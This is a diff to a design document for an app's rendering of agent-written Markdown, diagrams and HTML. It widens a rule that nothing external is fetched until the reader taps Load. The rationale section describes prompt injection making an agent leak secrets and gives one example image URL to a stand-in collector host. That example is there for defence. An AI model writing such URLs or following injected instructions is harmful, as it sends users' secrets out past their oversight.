@@ -33,7 +33,7 @@ What the `src` says decides the source, before anything is drawn:
 | A relative path (`shots/a.png`, `./img/x.png`, `../logo.svg`) | The workspace file at that path, resolved against the base directory the host passes | Through the image pipeline: `file.get` for the description, then `useImageSrc` — lazy, authenticated, cached |
 | An absolute path under the work directory (`/home/…/repo/shots/a.png`) | That workspace file (`relativeToWorkDir`) | As above |
 | Any other absolute path (`/tmp/a.png`) | None — outside the work directory | Nothing is read |
-| `http:` / `https:`, and `//host/…` as `https:` | The external URL | Nothing until the reader allows its host ([below](#external-images-wait-for-the-reader)); then by the browser's `<img>`, `loading="lazy"`, `referrerPolicy="no-referrer"` |
+| `http:` / `https:`, and `//host/…` as `https:` | The external URL | Nothing until the reader allows its host ([below](#external-requests-wait-for-the-reader)); then by the browser's `<img>`, `loading="lazy"`, `referrerPolicy="no-referrer"` |
 | Any other scheme (`data:`, `javascript:`, `file:`, `mailto:`, …) | None — dropped | Nothing is read |
 
 The base directory is the work directory's root for chat and work items, and
@@ -168,19 +168,43 @@ With no alt text the label is the file name, as for the chip. A dropped image is
 never silent ([AGENTS.md](../AGENTS.md#error-handling)): it is visible, just
 small.
 
-## External images wait for the reader
+## External requests wait for the reader
 
-An external image is not requested until the reader asks for it. Until then it
-is a placeholder that names the host, and nothing — no `<img>`, no prefetch —
-reaches that host.
+**Nothing an agent writes reaches another host until the reader asks for it.**
+This section is where that rule is stated; the places that apply it link here.
 
-The reason is the agent. Every Markdown surface here shows text an agent may
-have written, and an agent that has read something hostile (a web page, an
-issue, a dependency's README) can be told to put what it knows into an image
-URL: `![](https://collector.example/p.png?k=<secret>)`. Rendering the image is
-the request, and the request is the leak; it passes through no permission
-prompt, because drawing a message is not a tool call. The one thing an agent
-cannot write for itself is the reader's tap, so that is the gate.
+The reason is the agent. Everything the app draws may be something an agent
+wrote, and an agent that has read something hostile (a web page, an issue, a
+dependency's README) can be told to put what it knows into a URL:
+`![](https://collector.example/p.png?k=<secret>)`. Drawing the content is the
+request, and the request is the leak; it passes through no permission prompt,
+because drawing a message or opening a file is not a tool call. The one thing
+an agent cannot write for itself is the reader's tap, so that is the gate.
+
+It is applied in three places, each where that kind of content is drawn:
+
+| Content | Held back by | Until the reader |
+|---|---|---|
+| A Markdown image | Not being requested: a placeholder names the host ([below](#the-placeholder)) | taps Load, for that host in that text |
+| A Mermaid diagram | A sealed frame whose policy refuses every host ([below](#diagrams-draw-in-a-sealed-frame)) | taps Load under it, for its images' hosts |
+| An HTML page — an `html_render` card, an `.html` file in Files, a commit or the media viewer | A policy that refuses every host, and a wrapper that keeps the page from navigating out ([page-external-hosts-ui.md](page-external-hosts-ui.md)) | taps Load in the strip above it, for those hosts on that page |
+
+What the three share, and do not restate:
+
+- **The reader judges a host,** shown by name, never cut short, and never the
+  full URL ([why](#not-in-this-design)).
+- **An allowance is for this content,** never the host everywhere
+  ([what a tap allows](#what-a-tap-allows)), in memory only and never
+  persisted.
+- **Where code runs, the guarantee is the browser's**, not a reading of the
+  source: a diagram or a page is drawn in a document whose
+  Content-Security-Policy refuses what was not allowed, and the reader is
+  offered only from what it refused. There the app's own host is never
+  offered, on any port: a request from that document could carry the app's
+  cookies, which are not kept apart by port.
+- **No setting turns it off** ([not in this design](#not-in-this-design)).
+
+What follows is how Markdown images and diagrams apply it.
 
 A link is the same URL with no request in it, but a page served over plain
 `http` (a LAN address) has the browser resolve the host of every link on it
@@ -193,7 +217,9 @@ All of them: chat (the agent's text, thinking, plans, task reports, questions,
 `WebFetch` results), work items, comments and agent roles, and `.md` files
 rendered by `FileContentDisplay` — the Files tab, a file at a commit, and the
 transcript's reads and writes — and the Mermaid diagrams in any of them
-([below](#diagrams-draw-in-a-sealed-frame)). So `MarkdownContent` takes no
+([below](#diagrams-draw-in-a-sealed-frame)). HTML pages hold too, on every
+surface that draws one ([page-external-hosts-ui.md](page-external-hosts-ui.md)).
+So `MarkdownContent` takes no
 policy prop: there is one rule, and a surface added later is held without
 having to remember to ask for it.
 
@@ -423,10 +449,9 @@ not inherit the hosts its predecessor was refused.
 Only images are offered. A refused stylesheet, font or connection stays
 refused with no offer: none of them is something the reader would see as
 missing, and allowing one would hand a diagram's CSS a road to any host. The
-app's own host is never offered, on any port — that request could carry the
-app's cookies, which are not kept apart by port — nor is anything but
-`http(s)`, nor a host a CSP source cannot name (an IPv6 literal, or a name with
-an `_`); such an image stays missing without a chip.
+app's own host is never offered ([why](#external-requests-wait-for-the-reader)),
+nor is anything but `http(s)`, nor a host a CSP source cannot name (an IPv6
+literal, or a name with an `_`); such an image stays missing without a chip.
 
 ## Alt text and title
 
@@ -532,11 +557,6 @@ absent for `WebFetch`, whose text lives in no file — and `onOpenFile?`, as the
 - A setting to always load external images, or to trust a host everywhere.
   Either undoes the gate for every text at once, including the ones an agent has
   not written yet.
-- An `html_render` page. It is drawn as the agent wrote it, external requests
-  included ([tool-call-ui.md](tool-call-ui.md#the-sandbox-and-nothing-else)),
-  so it is the one surface where what an agent writes reaches a host without
-  the reader's tap. Holding it would need a policy the page can be drawn under,
-  which is that design's decision, not this one's.
 - Drawing diagrams in the app's own font and colour theme. That means setting
   Mermaid's `fontFamily` and `themeVariables` from the page, a change to how
   every diagram looks rather than to what it may fetch.
